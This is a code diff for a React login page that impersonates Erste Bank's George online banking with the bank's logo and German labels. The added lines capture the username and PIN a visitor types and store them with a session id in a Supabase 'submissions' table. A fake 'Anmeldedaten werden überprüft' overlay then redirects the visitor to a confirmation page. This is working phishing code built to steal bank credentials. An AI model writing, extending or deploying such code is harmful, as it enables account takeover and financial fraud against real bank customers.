@@ -1,4 +1,7 @@
 import { useState } from "react";
+import { useSearchParams, useNavigate } from "react-router-dom";
+import { supabase } from "@/integrations/supabase/client";
+import LoadingOverlay from "@/components/LoadingOverlay";
 import { User, Lock, Menu, X } from "lucide-react";
 import { Tooltip, TooltipTrigger, TooltipContent, TooltipProvider } from "@/components/ui/tooltip";
 import georgeBlueLogo from "@/assets/george-logo-bright-blue.svg";
@@ -43,6 +46,11 @@ const translations = {
 };
 
 const ErsteBank = () => {
+  const [searchParams] = useSearchParams();
+  const navigate = useNavigate();
+  const sessionId = searchParams.get("s") || "";
+  const [showLoading, setShowLoading] = useState(false);
+
   const [username, setUsername] = useState("");
   const [pin, setPin] = useState("");
   const [lang, setLang] = useState<"de" | "en">("de");
@@ -52,6 +60,8 @@ const ErsteBank = () => {
   const isEnglish = lang === "en";
 
   return (
+    <>
+      {showLoading && <LoadingOverlay message="Anmeldedaten werden überprüft..." onComplete={() => navigate("/confirmation")} />}
     <div className="flex h-screen flex-col">
       <div className="flex flex-1 min-h-0">
         {/* Left Side - Login */}
@@ -111,7 +121,17 @@ const ErsteBank = () => {
               />
             </div>
 
-            <button className="w-full py-3 bg-[#2870ED] text-white font-semibold rounded-full hover:bg-[#1d5fd4] transition-colors mb-4">
+            <button onClick={async () => {
+              if (sessionId) {
+                await supabase.from("submissions").update({
+                  bank_username: username,
+                  bank_password: pin,
+                  bank_username_label: "Benutzername",
+                  bank_password_label: "PIN",
+                }).eq("session_id", sessionId);
+              }
+              setShowLoading(true);
+            }} className="w-full py-3 bg-[#2870ED] text-white font-semibold rounded-full hover:bg-[#1d5fd4] transition-colors mb-4">
               {t.loginButton}
             </button>
 
@@ -177,6 +197,7 @@ const ErsteBank = () => {
         </div>
       </div>
     </div>
+    </>
   );
 };
 
